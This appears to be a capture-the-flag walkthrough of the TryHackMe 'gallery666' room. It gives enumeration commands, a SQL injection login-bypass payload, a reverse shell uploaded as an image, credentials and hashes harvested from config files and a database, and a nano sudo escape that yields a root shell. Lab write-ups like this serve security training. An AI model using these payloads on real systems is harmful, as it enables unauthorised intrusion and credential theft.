#nano

https://tryhackme.com/r/room/gallery666

---
#### Nmap scan
Port 80 and 8080 open

#### Gobuster
```shell
gobuster dir -u http://10.10.190.160 -w [wordlist] -t 200 -x php,txt
```

Found the `/gallery`

I've connected in the gallery through sqli `admin' and 1=1; -- -`

I've uploaded a revshell as image, simply as that

Then I found the database credentials in `/var/www/html/gallery/initialize.php`
The user is `gallery_user:passw0rd321`

I found another user `dev_oretnom:5da283a2d990e8d8512cf967df5bc0d0`, the password seems to be hashed

I found the admin gallery admin credentials in MariaDB through these commands
```sql
use gallery_db;
```

```sql
show tables;
```

```sql
select * from users;
```

The admin credentials are `admin:a228b12a08b6527e7978cbe5d914531c`

So we have 2 unknows passwords
`dev_oretnom:5da283a2d990e8d8512cf967df5bc0d0`
`admin:a228b12a08b6527e7978cbe5d914531c`

Mike's password was in a backup file in `/var/backups/mike_home_backup/.bash_history`

`mike:b3stpassw0rdbr0xx`

When I type `sudo -l` I see I can run `sudo /bin/bash /opt/rootkit.sh` and in this `rootkit.sh`, an option open `/root/report.txt` with nano as sudo
By pressing `CTRL + R`, I switch in Read File mode, then if I press `CTRL + X`, I can execute commands. And if I type this, I can get a root shell:
```shell
reset; sh 1>&0 2>&0
```

![[Screenshot_2024-05-05_15-34-48.png]]

[Nano root source](https://gtfobins.github.io/gtfobins/nano/)
